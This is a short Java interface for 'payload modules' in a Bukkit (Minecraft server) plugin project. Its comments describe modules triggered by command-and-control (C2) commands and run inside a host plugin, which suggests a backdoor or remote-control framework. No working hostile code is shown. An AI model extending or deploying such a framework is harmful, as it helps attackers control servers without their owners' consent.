package dev.naruto.astrox.payload.modules;

import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Interface for modular payload capabilities.
 * Implementations are discovered at runtime via {@link java.util.ServiceLoader}.
 */
public interface PayloadModule {

    /**
     * Unique module identifier (used in C2 commands and chat commands).
     */
    String getName();

    /**
     * Human-readable description.
     */
    String getDescription();

    /**
     * Module category for help display.
     */
    default String getCategory() {
        return "Module";
    }

    /**
     * Execute the module's functionality.
     *
     * @param sender the player who triggered the command (may be null for C2)
     * @param args   command arguments
     * @param plugin the host JavaPlugin instance
     * @return execution result as a string (for C2 response)
     */
    String execute(Player sender, String[] args, JavaPlugin plugin);
}
